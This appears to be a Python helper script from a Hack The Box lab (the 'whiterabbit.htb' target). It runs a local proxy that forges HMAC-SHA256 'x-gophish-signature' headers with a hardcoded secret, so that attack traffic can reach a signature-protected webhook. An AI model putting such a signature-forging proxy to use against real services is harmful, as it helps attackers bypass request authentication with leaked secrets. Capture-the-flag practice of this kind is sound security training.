#!/usr/bin/env python3
import argparse, requests, hmac, hashlib, threading, socketserver, http.server, urllib.parse

class ProxyHandler(http.server.BaseHTTPRequestHandler):
    secret = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"  # <-- Replace with your actual secret
    target = "http://28efa8f7df.whiterabbit.htb"   # <-- Replace with your actual target root URL

    def _proxy(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length) if length else b''

        # Compute HMAC over raw body bytes
        sig = hmac.new(self.secret, body, hashlib.sha256).hexdigest()
        sig_header_value = "sha256=" + sig

        # Copy headers except 'Host' and existing sig
        headers = {k: v for k, v in self.headers.items()
                   if k.lower() not in ['host', 'x-gophish-signature']}
        headers['x-gophish-signature'] = sig_header_value

        url = urllib.parse.urljoin(self.target, self.path)
        resp = requests.request(self.command, url, headers=headers, data=body, allow_redirects=False)

        self.send_response(resp.status_code)
        for k, v in resp.headers.items():
            if k.lower() in ['transfer-encoding', 'connection', 'keep-alive',
                             'proxy-authenticate', 'proxy-authorization',
                             'te', 'trailers', 'upgrade']:
                continue
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(resp.content)

    def do_GET(self): self._proxy()
    def do_POST(self): self._proxy()
    def do_PUT(self): self._proxy()
    def do_DELETE(self): self._proxy()
    def log_message(self, format, *args): return

if __name__=='__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("--listen", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8082)
    parser.add_argument("--target", required=False)
    parser.add_argument("--secret", required=False)
    args = parser.parse_args()

    if args.secret:
        ProxyHandler.secret = args.secret.encode()
    if args.target:
        ProxyHandler.target = args.target

    server = socketserver.ThreadingTCPServer((args.listen, args.port), ProxyHandler)
    print(f"[+] Signing proxy listening on {args.listen}:{args.port} -> {ProxyHandler.target}")
    server.serve_forever()
